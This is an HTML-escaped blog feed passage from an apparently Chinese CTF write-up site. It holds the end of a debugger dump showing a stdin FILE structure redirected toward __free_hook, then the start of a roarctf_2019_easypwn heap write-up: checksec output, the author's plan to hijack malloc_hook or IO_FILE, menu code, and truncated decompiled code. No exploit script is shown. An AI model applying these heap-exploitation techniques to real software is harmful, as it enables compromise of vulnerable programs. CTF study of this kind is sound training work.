class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *)&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;-72539989&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x7f0883e32901&lt;/span&gt; &amp;lt;_IO_2_1_stdin_+&lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x7f0883e32928&lt;/span&gt; &amp;lt;_IO_2_1_stdin_+&lt;span class=&#34;number&#34;&gt;72&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x7f0883e32900&lt;/span&gt; &amp;lt;_IO_2_1_stdin_+&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x7f0883e347a8&lt;/span&gt; &amp;lt;__free_hook&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x7f0883e347b8&lt;/span&gt; &amp;lt;next_to_use&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x7f0883e34790&lt;/span&gt; &amp;lt;_IO_stdfile_0_lock&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x7f0883e329c0&lt;/span&gt; &amp;lt;_IO_wide_data_0&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0x7f0883e316e0&lt;/span&gt; &amp;lt;_IO_file_jumps&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/03/21/roarctf-2019-easypwn/</guid>
            <title>roarctf_2019_easypwn</title>
            <link>http://example.com/2022/03/21/roarctf-2019-easypwn/</link>
            <category>writeup</category>
            <pubDate>Mon, 21 Mar 2022 23:38:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;这次的题比较难搞但是攻击点挺单一过程中里到了2个手法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这次的题比较难搞但是攻击点挺单一过程中里到了2个手法&#34;&gt;#&lt;/a&gt; 这次的题比较难搞，但是攻击点挺单一，过程中里到了 2 个手法&lt;/h1&gt;
&lt;h2 id=&#34;环境以及保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境以及保护&#34;&gt;#&lt;/a&gt; 环境以及保护&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;giantbranch@ubuntu:~/Desktop/buuoj/roarctf_2019_easy_pwn$ checksec --file=roarctf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/giantbranch/Desktop/buuoj/roarctf_2019_easy_pwn/roarctf&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;保护全开了，那么我们只能考虑劫持 malloc_hook, 或者 IO_FILE。这里我还是优先考虑了劫持 mallochook，使用 onegadget。还是因为 buuoj 不给 libc，虽然 ubuntu16 的 docker 容器中 glibc 通常为 ubunt11.2 或者 ubuntu11.3，但是这里还是不行，猜测可能是 11.1 的版本，这里就不过多的猜测了，泄露版本永远都不是重点和难点。&lt;/p&gt;
&lt;h3 id=&#34;题目主要代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题目主要代码&#34;&gt;#&lt;/a&gt; 题目主要代码&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Note system&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1. create a note&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;2. write note&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;3. drop the note&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;4. show the note&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;5. exit&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其实每次看这个 menu 的页面，就可以知道重点关注什么地方了。这个题呢，还是毕竟规矩的创建，编辑，输出，删除。考虑几个点有没有溢出，有没有 UAF.&lt;/p&gt;
&lt;p&gt;很遗憾这个题并没有太多的机会，只有 1 字节溢出，free 后指针清空&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 &lt;span class=&#34;title function_&#34;&gt;sub_C46&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-1Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  result = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt;= &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = *((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)&amp;amp;inuse + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * i);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !(_DWORD)result )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    